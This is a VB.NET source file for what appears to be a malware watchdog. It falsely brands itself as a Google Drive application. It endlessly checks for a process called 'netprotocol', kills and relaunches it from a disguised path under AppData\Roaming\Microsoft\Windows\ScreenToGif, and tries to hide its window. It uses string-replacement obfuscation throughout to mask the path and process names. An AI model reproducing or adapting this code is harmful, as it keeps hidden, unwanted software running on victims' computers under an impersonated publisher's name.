Imports System.Reflection
Imports System.Text
Imports System.Security.Cryptography
Imports System.Security
Imports System.Diagnostics
Imports System.IO
Imports System.Net
Imports System.Collections
Imports System
Imports System.Threading
Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Imports Microsoft.Win32
Imports Microsoft.VisualBasic
Imports System.CodeDom.Compiler
Imports System.Environment

<Assembly: AssemblyTitle("Google Application")> 
<Assembly: AssemblyDescription("Google Drive")> 
<Assembly: AssemblyCompany("Google America (c)")> 
<Assembly: AssemblyProduct("Google America Web Drivers")> 
<Assembly: AssemblyCopyright("Google USA (c) 1996-2016")> 
<Assembly: AssemblyTrademark("Google USA (c) 1996-2016")> 
<Assembly: AssemblyVersion("1.1.2.4")> 
<Assembly: AssemblyFileVersion("1.1.2.4")> 

Module GoogleShuffler

    Private check As Mutex

    Public Sub checkifopen(ByVal mute As String)
        Try
            System.Threading.Mutex.OpenExisting(mute)
            End
        Catch ex As Exception
            check = New System.Threading.Mutex(False, mute)
            Exit Sub
        End Try
    End Sub

    Sub Main()

        checkifopen("483287XX")

        Do

            AmericaApp()
			system.threading.thread.sleep(2000)
        Loop

    End Sub

  

    Private Sub AmericaApp()
        Try

            Dim count As Integer
Again:
            count = 0

            For Each pro As Process In Process.GetProcessesByName("aerosol".replace("aeros","netprotoc"))
                count += 1
                If count > 3 Then
                    count = 2
                    GoTo Again
                End If
            Next

            If count = 1 Then
                Process.GetProcessesByName("aerosol".replace("aeros","netprotoc"))(0).Kill()
				system.threading.thread.sleep(3000)
                count = 0
            End If
            If count = 0 Then
                Dim processz As New Process()
                processz.StartInfo.FileName =  ret("US55ILE".Replace("5", "ERPROF")) & "\App1ming".Replace("1", "Data\Roa") & "*Microsoft*Windows*ScreenToGif*netprotocol.e2323".Replace("2323", "xe").Replace("*","\")
                processz.StartInfo.Arguments = "-n"
                Dim assassino As Integer = 4
                Do
                    assassino += 2
					if assassino = 5 + 6 - 10 then
					processz.StartInfo.WindowStyle = assassino
					end if
                Loop Until assassino = 8
               ' processz.StartInfo.WindowStyle = assassino - 3 - 4 'System.Diagnostics.ProcessWindowStyleProcessWindowStyle.Hidden
                processz.Start()
				system.threading.thread.sleep(8000)

Wait:
                count = 0
                For Each file As Process In Process.GetProcessesByName("aerosol".replace("aeros","netprotoc"))
                    count += 1
                Next
                If count = 2 Then
                    GoTo Again
                Else
                    GoTo Wait
                End If

            End If
        Catch
        End Try


    End Sub
  
    Public Function ret(byval crap as string) As String
        Return "a".Replace("a", CStr(Environ(crap)))
    End Function
End Module